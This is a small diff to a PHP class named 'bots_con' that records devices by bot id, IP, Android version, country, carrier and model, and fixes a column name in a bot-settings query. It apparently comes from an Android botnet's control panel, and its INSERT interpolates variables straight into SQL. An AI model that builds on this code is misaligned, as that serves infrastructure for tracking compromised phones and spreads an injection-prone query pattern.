@@ -267,7 +267,7 @@ class bots_con
 		value ('$idbot','$ip','$android','$tag','$country','$date','$date','$operator','$model', '1')");
     $statement->execute(array());
 
-    $statement = $connection->prepare("SELECT idbot FROM bot_settings WHERE bot_id=?");
+    $statement = $connection->prepare("SELECT bot_id FROM bot_settings WHERE bot_id=?");
     $statement->execute(array($idbot));
     $bool = false;
     foreach ($statement as $row) { //check bot_settings
